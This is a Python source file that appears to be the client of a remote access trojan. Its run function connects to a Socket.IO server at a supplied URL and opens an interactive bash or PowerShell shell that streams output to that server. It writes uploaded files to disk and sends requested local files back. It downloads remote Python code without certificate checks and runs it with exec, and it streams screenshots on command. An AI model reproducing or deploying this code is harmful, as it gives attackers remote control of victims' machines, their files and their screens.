import os
import subprocess
import threading
import platform
import socketio
import ssl
from urllib.request import urlopen
import importlib.util
import base64
import io
import time
from PIL import Image
import mss

# Declare the global stop event
stop_event = threading.Event()

def run(data):
    def create_module(url):
        # Create an SSL context that doesn't verify certificates
        context = ssl._create_unverified_context()
        with urlopen(url, context=context) as response:
            code = response.read().decode('utf-8')
    
        spec = importlib.util.spec_from_loader('temp', loader=None)
        module = importlib.util.module_from_spec(spec)
    
        # Execute the code in the module's namespace
        exec(code, module.__dict__)
    
        return module

    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    if system == "Linux" or system == "Darwin":
        shellScript = "bash"
    elif system == 'Windows':
        shellScript = "powershell"
    else:
        shellScript = "bash"

    class InteractiveShell:
        def __init__(self):
            self.process = None
            self.master_fd = None  # Master file descriptor for PTY on Unix systems
            self.running = False

        def start(self):
            self.running = True
            if os.name == 'posix':  # Unix-like systems
                import pty
                self.master_fd, slave_fd = pty.openpty()
                self.process = subprocess.Popen(
                    [shellScript],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    universal_newlines=True,
                    close_fds=True
                )
                output_thread = threading.Thread(target=self.read_output_posix)
            else:  # Windows
                self.process = subprocess.Popen(
                    [shellScript],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    universal_newlines=True,
                    shell=True
                )
                output_thread = threading.Thread(target=self.read_output_windows)

            output_thread.start()

        def read_output_posix(self):
            while self.running:
                try:
                    output = os.read(self.master_fd, 1024).decode("utf-8")
                    if output:
                        sio.emit("result", output)
                except OSError:
                    break

        def read_output_windows(self):
            while self.running:
                output = self.process.stdout.readline()
                if output:
                    sio.emit("result", output)

        def write_input(self, command):
            if os.name == 'posix':
                os.write(self.master_fd, command.encode() + b"\n")
            else:
                self.process.stdin.write(command + "\n")
                self.process.stdin.flush()

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        print(sio.sid)
        print(data["uuid"])

    @sio.on('upload_file')
    def upload_file(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data_new['file_name'])
            with open(data_new['file_name'], 'wb') as f:
                decoded_data = base64.b64decode(data_new['file'])
                f.write(decoded_data)

    @sio.on("download_file")
    def download_file(data_new):
        if data['uuid'] == data_new['uuid']:
            with open(data_new['file_path'], 'rb') as f:
                file = f.read()
            file_ready = base64.b64encode(file).decode('utf-8')
            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
            print("emitted")

    @sio.on("pem")
    def pem(data_new):
        if data['uuid'] == data_new['uuid']:
            print(data['url'] + data_new['url'])
            module = create_module(data['url'] + data_new['url'])
            module.run(sio, data['uuid'])

    def take_screenshots(sio, uid, fps=5, quality=20):
        frame_interval = 1 / fps
        last_capture_time = 0

        with mss.mss() as sct:
            monitor = sct.monitors[0]  # Capture the entire screen

            while not stop_event.is_set():
                current_time = time.time()
                if current_time - last_capture_time >= frame_interval:
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    
                    with io.BytesIO() as output:
                        img.save(output, format="JPEG", quality=quality)
                        jpeg_data = output.getvalue()
                    
                    sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
                    print("Sent compressed screenshot")
                    last_capture_time = current_time

                time.sleep(0.001)

    screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))

    @sio.on("screen_status")
    def screen_status(data_new):
        if data['uuid'] == data_new['uid']:
            if data_new['status'] == "start":
                stop_event.clear()
                screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
                screenshot_thread.start()
            else:
                stop_event.set()
                try:
                    screenshot_thread.join()
                except:
                    print("Thread is already dead")

    sio.connect(data['url'])

    shell = InteractiveShell()
    shell.start()
    sio.wait()
